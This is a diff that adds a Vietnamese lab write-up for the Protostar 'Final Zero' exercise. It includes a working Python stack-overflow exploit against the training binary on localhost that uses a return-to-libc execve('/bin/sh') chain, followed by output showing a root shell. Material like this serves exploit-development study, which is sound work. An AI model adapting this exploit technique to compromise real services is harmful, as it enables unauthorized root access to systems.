@@ -70,12 +70,52 @@ int main(int argc, char **argv, char **envp)
 
 ## Solutions
 
-`FINAL ZERO` 
+`FINAL ZERO` là hướng dẫn khai thác stack overflow và viết mã khai thác chương trình đang chạy remote.
 
+Về cơ bản, chương trình yêu cầu chùng ta nhập một tên người dùng và sau đó trả lại nó ở dạng chữ hoa. Các ký tự `'\n'` và `'\r'` trong input chúng ta gửi đi sẽ dược thay thế bằng `NULL`, đây là một điều cần lưu ý vì bên dưới đoạn code `strlen()` và `strdup()` sẽ dừng tại `NULL` nếu như các ký tự trong chuỗi bị thay thế.
+
+File final0.py
+
+```
+import struct
+import socket
+import telnetlib
+
+HOST = '127.0.0.1'
+PORT = 2995
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((HOST, PORT))
+
+padding = "a"*510+"\x00"+"aaaabbbbccccddddeeeef"
+execve = struct.pack("I", 0x08048c0c)
+binsh = struct.pack("I", 1176511 + 0xb7e97000)
+exploit = padding + execve + "AAAA" + binsh + "\x00"*8
+
+s.send(exploit+"\n")
+s.send("id\n")
+print s.recv(1024)
+
+t = telnetlib.Telnet()
+t.sock = s
+t.interact()
+```
+
+Khai thác.
+
+```
+root@protostar:/# /opt/protostar/bin/final0
+root@protostar:/tmp# python final0.py
+uid=0(root) gid=0(root) groups=0(root)
+
+uname -a
+Linux protostar 2.6.32-5-686 #1 SMP Mon Oct 3 04:15:24 UTC 2011 i686 GNU/Linux
+
+
+```
 
 ## Documents
 
-
+[Final0](https://www.youtube.com/watch?v=HAN8Qun26cQ)
 
 
 
